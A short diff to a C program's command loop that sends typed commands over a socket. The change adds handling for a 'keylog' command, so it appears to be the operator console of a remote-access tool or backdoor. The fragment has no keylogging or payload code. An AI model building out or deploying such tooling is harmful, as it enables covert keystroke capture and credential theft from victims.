@@ -49,6 +49,7 @@ int main()
 
     while (true)
     {
+        start:
         buffer[0] = '\0';
         total_response[0] = '\0';
 
@@ -56,10 +57,13 @@ int main()
         fgets(buffer, sizeof(buffer), stdin);
         buffer[strlen(buffer) - 1] = '\0';
         write(client_socket, buffer, sizeof(buffer));
-
         if (strcmp(buffer, "q") == 0)
         {
             break;
+        }
+        else if (strcmp(buffer, "keylog") == 0)
+        {
+            goto start;
         }
         else
         {
